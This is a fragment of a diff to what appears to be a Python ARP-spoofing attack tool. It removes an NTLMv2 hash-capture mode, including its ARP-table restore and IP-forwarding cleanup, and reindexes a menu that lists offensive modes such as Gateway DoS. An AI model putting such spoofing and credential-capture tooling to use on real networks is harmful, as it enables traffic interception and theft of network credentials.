-                end="\r"
-            )
-            time.sleep(1)
-            elapsed += 1
-    except KeyboardInterrupt:
-        stop_flag.set()
-        t.join(timeout=3)
-        console.print(f"\n  [{C_ORANGE}]Restoring both ARP tables...[/{C_ORANGE}]")
-        for _ in range(10):
-            try:
-                sendp(
-                    Ether(src=gw_mac, dst=target_mac) /
-                    ARP(op=2, hwsrc=gw_mac, psrc=default_gateway_ip,
-                        hwdst=target_mac, pdst=target_ip),
-                    verbose=False, iface=default_interface
-                )
-                sendp(
-                    Ether(src=target_mac, dst=gw_mac) /
-                    ARP(op=2, hwsrc=target_mac, psrc=target_ip,
-                        hwdst=gw_mac, pdst=default_gateway_ip),
-                    verbose=False, iface=default_interface
-                )
-            except Exception:
-                pass
-            time.sleep(0.2)
-        try:
-            with open("/proc/sys/net/ipv4/ip_forward", "w") as _f:
-                _f.write("0")
-        except Exception:
-            pass
-        hashes = len(ntlm_cap._hashes) if ntlm_cap else 0
-        ok(f"Capture stopped. {hashes} hash(es) captured. ARP tables restored.")
-        log("NTLM_CAPTURE_STOP", hashes=hashes)
-
-
 # ── Main Menu ──────────────────────────────────────────────────────────────────
 MENU_ITEMS = [
     # ── Offensive ──
@@ -2373,7 +2088,6 @@ MENU_ITEMS = [
     ("7",  "Gratuitous ARP Broadcast",  mode_gratuitous_arp),
     ("8",  "Gateway DoS",               mode_gateway_dos),
     ("9",  "ARP Cage [Full Isolate]",   mode_arp_cage),
-    ("0",  "NTLMv2 Capture",           mode_ntlm_capture),
     # ── Recon ──
     ("A",  "ARP Request Scan",          mode_arp_scan),
     ("B",  "Target Recon",              mode_target_recon),
@@ -2407,7 +2121,7 @@ MENU_ITEMS = [
 def draw_menu():
     console.print()
     console.print(Rule(f"[bold {C_BLOOD}] OFFENSIVE [/bold {C_BLOOD}]", style=C_RUST))
-    offensive = MENU_ITEMS[:10]
+    offensive = MENU_ITEMS[:9]
     left  = offensive[:5]
     right = offensive[5:]
     for i in range(max(len(left), len(right))):
@@ -2417,13 +2131,13 @@ def draw_menu():
 
     console.print()
     console.print(Rule(f"[bold {C_STEEL}] RECON [/bold {C_STEEL}]", style=C_DIM))
-    recon = MENU_ITEMS[10:13]
+    recon = MENU_ITEMS[9:12]
     for item in recon:
         console.print(f"  [{C_BLOOD}][{item[0]}][/{C_BLOOD}]  [{C_ASH}]{item[1]}[/{C_ASH}]")
 
     console.print()
     console.print(Rule(f"[bold {C_GOOD}] DEFENSIVE [/bold {C_GOOD}]", style="#1E5631"))
-    defense = MENU_ITEMS[13:]
+    defense = MENU_ITEMS[12:]
     left  = defense[:4]
     right = defense[4:]
     for i in range(max(len(left), len(right))):
